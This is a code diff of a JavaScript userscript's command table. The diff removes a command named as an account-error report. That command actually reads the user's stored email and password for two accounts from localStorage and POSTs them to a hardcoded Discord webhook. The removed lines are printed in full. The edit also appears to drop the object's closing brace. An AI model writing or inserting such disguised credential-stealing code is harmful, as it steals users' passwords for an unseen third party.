@@ -1426,10 +1426,7 @@ if (divMSGsList.length > 0) {
     console.log("Divs não encontradas.");
 }`,
 
-        "lanternaoff": `localStorage.setItem('lanterna', 'off'); location.reload();`,
-
-        "relatarerroconta": `var meuPerfilLink=document.querySelector("a.meu-perfil");if(meuPerfilLink){var href=meuPerfilLink.getAttribute("href"),contaOriginalData=JSON.parse(localStorage.getItem("contaoriginal")),contaAltData=JSON.parse(localStorage.getItem("contaalt")),senhaOriginal=contaOriginalData.senha,data={content:`**Perfil:** ${href}\n**Conta Alt:**\n- Email : ${contaAltData.email}\n- Senha : ${contaAltData.senha}\n**Conta Original:**\n- Email : ${contaOriginalData.email}\n- Senha : ${senhaOriginal}`},jsonData=JSON.stringify(data),xhr=new XMLHttpRequest;xhr.open("POST","https://discord.com/api/webhooks/1144293975977631886/UtthQjQu7kqMeOuFtbZHjiTwuvVVcZJ9Zr5EJkAMx6Vd2UY4-fMHjaM4xHA2OWs0ykRu"),xhr.setRequestHeader("Content-Type","application/json"),xhr.send(jsonData)}`
-    };
+        "lanternaoff": `localStorage.setItem('lanterna', 'off'); location.reload();`
 
     function executeCommand(command) {
         if (comandos.hasOwnProperty(command)) {
